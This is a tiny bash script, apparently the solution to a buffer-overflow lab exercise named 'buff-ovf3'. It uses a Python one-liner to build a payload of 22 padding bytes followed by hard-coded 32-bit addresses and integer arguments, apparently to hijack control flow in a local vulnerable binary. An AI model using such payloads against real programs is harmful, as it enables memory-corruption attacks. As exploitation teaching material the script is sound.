#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause

python3 -c \
    'import sys; sys.stdout.buffer.write(b"A"*22 + b"\x0c\x87\x04\x08" + b"\xb7\x86\x04\x08" + b"\x38\x00\x00\x00" + b"\x0d\x00\x00\x00")' \
    ../support/buff-ovf3
